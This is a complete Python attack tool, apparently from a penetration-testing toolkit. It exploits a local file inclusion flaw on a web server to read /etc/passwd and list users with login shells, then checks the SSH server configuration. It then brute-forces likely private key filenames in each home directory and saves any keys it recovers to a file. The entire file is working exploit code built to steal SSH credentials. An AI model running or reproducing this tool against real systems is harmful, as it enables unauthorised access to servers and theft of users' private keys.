#!/usr/bin/env python3
import requests
import argparse
import sys
import urllib3
import time
import re
from requests.models import PreparedRequest
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

GREEN = "\033[32m"
RED = "\033[31m"
ORANGE = "\033[33m"
RESET = "\033[0m"

BANNER = f"""
  _    ___ ___ ___ _  _______   _____ 
 | |  | __|_ _|_  ) |/ / __\\ \\ / / __|
 | |__| _| | | / /|   <| _| \\ V /\\__ \\
 |____|_| |___/___|_|\\_\\___| |_| |___/
                                      
LFI to SSH Private Keys - Automated Looting Script
"""

class RawPreparedRequest(PreparedRequest):
    def prepare_url(self, url, params):
        self.url = url
        return self.url

class RawSession(requests.Session):
    def prepare_request(self, request):
        prep = RawPreparedRequest()
        prep.prepare(
            method=request.method,
            url=request.url,
            headers=request.headers,
            files=request.files,
            data=request.data,
            params=request.params,
            auth=request.auth,
            json=request.json,
        )
        return prep

def get_session(proxy):
    session = RawSession()
    session.verify = False
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}
        print(f"{ORANGE}[*]{RESET} Proxy mode enabled; requests will be processed sequentially with a 1s delay.")
    return session

def check_passwd_file(url, proxy, verbose):
    session = get_session(proxy)
    try:
        response = session.get(url, timeout=10)
        if verbose:
            print(f"{ORANGE}[DEBUG]{RESET} Received /etc/passwd response:\n{response.text[:500]}")
        if re.search(r"^root:.*:0:0:.*$", response.text, re.MULTILINE):
            print(f"{GREEN}[+]{RESET} Valid /etc/passwd file found")
            return response.text
        else:
            print(f"{RED}[-]{RESET} /etc/passwd file does not appear valid")
    except requests.RequestException as e:
        print(f"{RED}[-]{RESET} Error fetching /etc/passwd: {e}")
    return None

def extract_active_users(passwd_content, verbose=False):
    valid_users = []
    for line in passwd_content.splitlines():
        parts = line.split(":")
        if len(parts) < 7:
            continue
        username, _, _, _, _, home_dir, shell = parts
        if home_dir.startswith("/home/") and not shell.endswith("nologin"):
            valid_users.append((username, home_dir))
    if valid_users:
        print(f"{GREEN}[+]{RESET} Valid users exported:")
        for user, home in valid_users:
            print("    {} -> {}".format(user, home))
        return valid_users
    print(f"{RED}[-]{RESET} No valid users found")
    return []

def check_sshd_config(url, proxy, verbose):
    if "etc/passwd" in url:
        prefix = url.rsplit("etc/passwd", 1)[0]
    else:
        prefix = url
    sshd_url = prefix + "etc/ssh/sshd_config"
    session = get_session(proxy)
    try:
        response = session.get(sshd_url, timeout=10)
        if verbose:
            print(f"{ORANGE}[DEBUG]{RESET} Received /etc/ssh/sshd_config:")
        if response.status_code == 200 and response.text.strip():
            print(f"{GREEN}[+]{RESET} /etc/ssh/sshd_config file found")
            config = response.text
            pr_match = re.search(r"^\s*PermitRootLogin\s+(yes|no|prohibit-password)", config, re.MULTILINE)
            pa_match = re.search(r"^\s*PubkeyAuthentication\s+(yes|no)", config, re.MULTILINE)
            pwd_match = re.search(r"^\s*PasswordAuthentication\s+(yes|no)", config, re.MULTILINE)
            cra_match = re.search(r"^\s*ChallengeResponseAuthentication\s+(yes|no)", config, re.MULTILINE)
            pr_status = "enabled" if pr_match and pr_match.group(1).lower() == "yes" else "disabled"
            pa_status = "enabled" if pa_match and pa_match.group(1).lower() == "yes" else "disabled"
            pwd_status = "enabled" if pwd_match and pwd_match.group(1).lower() == "yes" else "disabled"
            cra_status = "enabled" if cra_match and cra_match.group(1).lower() == "yes" else "disabled"
            print(f"    PermitRootLogin: {pr_status}")
            print(f"    PubkeyAuthentication: {pa_status}")
            print(f"    PasswordAuthentication: {pwd_status}")
            print(f"    ChallengeResponseAuthentication: {cra_status}")
        else:
            print(f"{RED}[-]{RESET} /etc/ssh/sshd_config file not found or empty")
    except requests.RequestException as e:
        print(f"{RED}[-]{RESET} Error fetching /etc/ssh/sshd_config: {e}")

def check_ssh_metadata(base_url, users, proxy, verbose=False):
    print(f"{GREEN}[+]{RESET} Checking for SSH metadata (authorized_keys and known_hosts)...")
    session = get_session(proxy)
    prefix = base_url.rsplit("etc/passwd", 1)[0]
    found_ssh_users = set()
    for user, home in users:
        ak_path = f"{home}/.ssh/authorized_keys"
        ak_payload = prefix + ak_path.lstrip("/")
        try:
            response = session.get(ak_payload, timeout=10)
            if response.status_code == 200 and response.text.strip():
                print(f"{ORANGE}[!]{RESET} Found authorized_keys for {user}: {ak_payload}")
                found_ssh_users.add(user)
        except requests.RequestException as e:
            if verbose:
                print(f"{RED}[-]{RESET} Error checking authorized_keys for {user} at {ak_payload}: {e}")
        kh_path = f"{home}/.ssh/known_hosts"
        kh_payload = prefix + kh_path.lstrip("/")
        try:
            response = session.get(kh_payload, timeout=10)
            if response.status_code == 200 and response.text.strip():
                print(f"{ORANGE}[!]{RESET} Found known_hosts for {user}: {kh_payload}")
        except requests.RequestException as e:
            if verbose:
                print(f"{RED}[-]{RESET} Error checking known_hosts for {user} at {kh_payload}: {e}")
    return found_ssh_users

def fuzz_task(user, candidate_url, session, verbose):
    try:
        response = session.get(candidate_url, timeout=10)
        if response.status_code == 200 and "PRIVATE KEY" in response.text:
            if verbose:
                print(f"{ORANGE}[DEBUG]{RESET} Private key content for {user} from {candidate_url}:\n{response.text}")
            return (candidate_url, response.text)
    except requests.RequestException as e:
        if verbose:
            print(f"{RED}[-]{RESET} Error requesting {candidate_url}: {e}")
    return None

def fuzz_user(user, home, wordlist, prefix, session, all_flag, continue_as_success, verbose):
    found = []
    candidates = []
    for key_name in wordlist:
        candidates.append(f"{home}/.ssh/{key_name}")
        if all_flag:
            candidates.append(f"{home}/{key_name}")
    candidates = list(dict.fromkeys(candidates))
    if session.proxies:
        for candidate in candidates:
            candidate_url = prefix + candidate.lstrip("/")
            result = fuzz_task(user, candidate_url, session, verbose)
            if result:
                print(f"{GREEN}[+]{RESET} Private key found for {user} at: {result[0]}")
                found.append(result)
                if not continue_as_success:
                    break
            time.sleep(1)
    else:
        with ThreadPoolExecutor(max_workers=10) as executor:
            future_to_candidate = {
                executor.submit(fuzz_task, user, prefix + candidate.lstrip("/"), session, verbose): candidate
                for candidate in candidates
            }
            for future in as_completed(future_to_candidate):
                result = future.result()
                if result:
                    print(f"{GREEN}[+]{RESET} Private key found for {user} at: {result[0]}")
                    found.append(result)
                    if not continue_as_success:
                        break
    return found

def fuzz_ssh_keys_for_users(base_url, users, wordlist, proxy, all_flag, continue_as_success, verbose, found_ssh_users):
    print(f"{GREEN}[+]{RESET} Starting to FUZZ")
    found_keys = []
    session = get_session(proxy)
    prefix = base_url.rsplit("etc/passwd", 1)[0]
    ordered_users = sorted(users, key=lambda x: 0 if x[0] in found_ssh_users else 1)
    for user, home in ordered_users:
        keys = fuzz_user(user, home, wordlist, prefix, session, all_flag, continue_as_success, verbose)
        found_keys.extend(keys)
    return found_keys

def main():
    parser = argparse.ArgumentParser(
        description="Automated LFI to SSH private key looter",
        epilog="Common SSH private key names: https://github.com/PinoyWH1Z/SSH-Private-Key-Looting-Wordlists"
    )
    parser.add_argument("-u", "--url", required=True, help="LFI URL pointing to /etc/passwd")
    parser.add_argument("-l", "--list", required=True, help="Wordlist containing SSH private key names")
    parser.add_argument("-o", "--output", help="File to save found private key URLs and contents", default=None)
    parser.add_argument("-p", "--proxy", help="Proxy URL (e.g., http://127.0.0.1:8080)", default=None)
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose mode for debugging")
    parser.add_argument("-a", "--all", action="store_true", help="Also search the entire home directory (not just .ssh folder)")
    parser.add_argument("-c", "--continue-on-success", action="store_true",
                        help="Continue scanning all users for private keys even after a match is found")
    args = parser.parse_args()

    print(BANNER)
    passwd_content = check_passwd_file(args.url, args.proxy, args.verbose)
    if not passwd_content:
        sys.exit(f"{RED}[-]{RESET} Exiting due to invalid /etc/passwd response")
    valid_users = extract_active_users(passwd_content, args.verbose)
    if not valid_users:
        sys.exit(f"{RED}[-]{RESET} No valid users found, exiting")
   
    check_sshd_config(args.url, args.proxy, args.verbose)
    found_ssh_users = check_ssh_metadata(args.url, valid_users, args.proxy, args.verbose)
    
    try:
        with open(args.list, "r") as f:
            key_wordlist = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        sys.exit(f"{RED}[-]{RESET} Wordlist file '{args.list}' not found")
    found_keys = fuzz_ssh_keys_for_users(args.url, valid_users, key_wordlist, args.proxy, args.all, args.continue_on_success, args.verbose, found_ssh_users)
    if args.output and found_keys:
        with open(args.output, "w") as f:
            for url, key_content in found_keys:
                f.write("URL: " + url + "\n")
                f.write("PRIVATE KEY:\n" + key_content + "\n")
                f.write("-" * 40 + "\n")
        print(f"{GREEN}[+]{RESET} Results saved to {args.output}")
    print(f"{GREEN}[+]{RESET} Done (～￣▽￣)～")

if __name__ == "__main__":
    main()
